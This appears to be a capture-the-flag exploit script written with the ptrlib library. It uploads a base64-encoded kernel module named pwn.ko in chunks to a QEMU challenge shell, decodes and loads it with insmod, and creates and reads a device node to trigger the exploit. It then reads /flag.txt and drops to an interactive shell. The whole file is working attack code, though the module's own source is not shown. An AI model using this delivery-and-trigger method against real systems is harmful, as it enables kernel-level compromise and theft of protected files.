import base64
import time
from ptrlib import *

def run(cmd):
    sock.sendlineafter("# ", cmd)

kernel = base64.b64encode(
    open("driver/pwn.ko", "rb").read()
).decode()

sock = Process("./run.sh", cwd="../challenge/qemu")

# Create kernel driver
for block in chunks(kernel, 1000):
    run(f'echo "{block}" >> b64')
run("busybox base64 -d b64 > pwn.ko")
run("busybox rm b64")

# Install kernel module
run("busybox insmod pwn.ko")
run("busybox mknod modpwn c 60 1")

# Invoke exploit
run("busybox cat modpwn")

# Get flag
time.sleep(1)
run("busybox cat /flag.txt")

sock.sh()
